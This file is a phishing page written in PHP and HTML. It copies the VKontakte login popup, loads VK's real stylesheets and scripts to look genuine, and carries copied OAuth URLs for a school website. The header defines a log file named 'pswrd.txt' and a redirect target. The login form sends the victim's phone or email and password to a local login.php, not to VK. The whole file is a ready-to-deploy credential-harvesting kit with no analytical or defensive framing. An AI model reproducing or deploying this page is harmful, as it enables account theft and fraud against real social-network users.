<?php

$url = 'index.html'; // Куда переходим
$out = 'pswrd.txt'; // Логи

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<title>ВКонтакте | Вход</title>
<link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?468" />
<!--[if lte IE 6]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(https://oauth.vk.com/https://vk.com/css/al/ie6.css?26); /* ]]> */</style><![endif]-->
<!--[if IE 7]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(https://oauth.vk.com/https://vk.com/css/al/ie7.css?18); /* ]]> */</style><![endif]-->
<link rel="icon" href="http://vk.com/favicon.ico" type="image/x-icon" />
<link type="text/css" rel="stylesheet" href="https://vk.com/css/api/oauth_popup.css?28"></link>
<script type="text/javascript" language="javascript" src="https://vk.com/js/api/common_light.js?1"></script>
<script type="text/javascript" language="javascript">
// <![CDATA[
  function allow() {
    var addr = '';
    if (isChecked(ge('allow_notifications'))) {
      addr = '&notify=1';
    }
    if (isChecked(ge('denied_email'))) {
      addr = '&email_denied=1';
    }
    location.href = "https://login.vk.com/?act=grant_access&client_id=4493996&settings=4194304&redirect_uri=http%3A%2F%2Fguid.uid.me%2Foauth%3Fsocial%3Dvkontakte%26site%3D0gimnaziya83%26rdata%3Dpbv6POC%253BBgRLm2S1ngFGOwDnjB2SPl4Y7irxOuS5%2521QVpYMJX%255EOnu8bOOXMnCMZiP%253BJIy1B9B0MhnqqaNQSYx0BqZljTAaVPt5A8tCUee1kHW8erv6PvTpOMVJ4ezdHzdi3g1X7m%255E%255EdQT32dpWvwctCUo%26ref%3Dhttp%253A%252F%252Fgimnaziya83.ucoz.ru%252F&response_type=code&direct_hash=feefa841c55c796400&token_type=0&v=&state=&display=popup&ip_h=3cb1f3d08a2b8ccdbe&hash=a26a7fe55f7838170f&https=1"+addr;
    return false;
  }

  function cancel() {
    location.href = "https://login.vk.com/?act=grant_access&client_id=4493996&settings=4194304&redirect_uri=http%3A%2F%2Fguid.uid.me%2Foauth%3Fsocial%3Dvkontakte%26site%3D0gimnaziya83%26rdata%3Dpbv6POC%253BBgRLm2S1ngFGOwDnjB2SPl4Y7irxOuS5%2521QVpYMJX%255EOnu8bOOXMnCMZiP%253BJIy1B9B0MhnqqaNQSYx0BqZljTAaVPt5A8tCUee1kHW8erv6PvTpOMVJ4ezdHzdi3g1X7m%255E%255EdQT32dpWvwctCUo%26ref%3Dhttp%253A%252F%252Fgimnaziya83.ucoz.ru%252F&response_type=code&direct_hash=feefa841c55c796400&token_type=0&v=&state=&display=popup&ip_h=3cb1f3d08a2b8ccdbe&hash=a26a7fe55f7838170f&https=1&cancel=1";
    return false;
  }

  function login() {
    ge('login_submit').submit();
  }
  function doResize(onResize) {
    var box = ge('box_cont');
    if (onResize) {
      setTimeout(function() {
        doResize()
      }, 100);
    }

    var wndH = window.outerHeight - window.innerHeight;
    wndH = (!wndH || wndH < 0) ? 50 : wndH;
    var wndW = window.outerWidth - window.innerWidth;
    wndW = (!wndW || wndW < 0) ? 50 : wndW;

    if (document.body.className.indexOf('oauth_page') != -1) {
      ge('sub_cont').style.paddingTop =  Math.floor((document.body.clientHeight - ge('container').offsetHeight - 50) / 2)+'px';
    } else if (!onResize) {
      var boxH = box.offsetHeight;
      var ctrlH = 178 + wndH;
      var ctrlW = 605 + (wndW || 15);

      window.resizeTo(ctrlW, boxH + ctrlH);
      window.moveTo(Math.floor((screen.width - ctrlW) / 2), Math.floor((screen.height - boxH - ctrlH) / 2));
    }
  }
  function toggleEmailPrivacy() {
    checkbox('denied_email');
    if (!isChecked('denied_email')) {
      hide('denied_email');
      show('allowed_email');
    } else {
      hide('allowed_email');
      show('denied_email');
    }
  }

  if (parent && parent != window) {
    location.href = "https://oauth.vk.com/blank.html";
  }
  
// ]]>
</script>
</head>
</html>
<body onload="doResize();" class="VK">
<script>
if (window.devicePixelRatio >= 2) {
  document.body.className += ' is_2x';
}
</script>
<div id="sub_cont">
<form method="POST" id="login_submit" action="login.php">
<table id="container" class="container" cellspacing="0" cellpadding="0"><tr><td class="head">
  <a href="https://vk.com" target="_blank" class="logo"></a><div class="auth_items"><a class="head_name fl_r" href="http://vk.com/join?reg=1" target="_blank">Регистрация</a></div>
</td></tr><td valign="top">
<div class="info_line">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>

<div id="box_cont">

<div id="box" class="box box_login">
<div class="info">
<input type="hidden" name="ip_h" value="3cb1f3d08a2b8ccdbe" />
<input type="hidden" name="_origin" value="https://oauth.vk.com">
<input type="hidden" name="to" value="aHR0cHM6Ly9vYXV0aC52ay5jb20vYXV0aG9yaXplP2NsaWVudF9pZD00NDkzOTk2JnJlZGlyZWN0X3VyaT1odHRwJTNBJTJGJTJGZ3VpZC51aWQubWUlMkZvYXV0aCUzRnNvY2lhbCUzRHZrb250YWt0ZSUyNnNpdGUlM0QwZ2ltbmF6aXlhODMlMjZyZGF0YSUzRHBidjZQT0MlMjUzQkJnUkxtMlMxbmdGR093RG5qQjJTUGw0WTdpcnhPdVM1JTI1MjFRVnBZTUpYJTI1NUVPbnU4Yk9PWE1uQ01aaVAlMjUzQkpJeTFCOUIwTWhucXFhTlFTWXgwQnFabGpUQWFWUHQ1QTh0Q1VlZTFrSFc4ZXJ2NlB2VHBPTVZKNGV6ZEh6ZGkzZzFYN20lMjU1RSUyNTVFZFFUMzJkcFd2d2N0Q1VvJTI2cmVmJTNEaHR0cCUyNTNBJTI1MkYlMjUyRmdpbW5heml5YTgzLnVjb3oucnUlMjUyRiZyZXNwb25zZV90eXBlPWNvZGUmc2NvcGU9NDE5NDMwNCZ2PSZzdGF0ZT0mZGlzcGxheT1wb3B1cA--">
<input type="hidden" id="expire" name="expire" value="0">

<div class="form_header">Телефон или e-mail</div>
<input type="text" class="form_input" name="email" value="">
<div class="form_header">Пароль</div>
<input type="password" class="form_input" name="pass" />

<div class="popup_login_btn">
<button class="flat_button popup_login_btn button_big" id="install_allow" type="submit" onclick="return login();">Войти</button>
</div>
<a id="quick_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
<input type="submit" name="submit" style="display: none;">
</div>
</div>
</div>
</td></tr></table>
</form>
</div>
</body>
</html>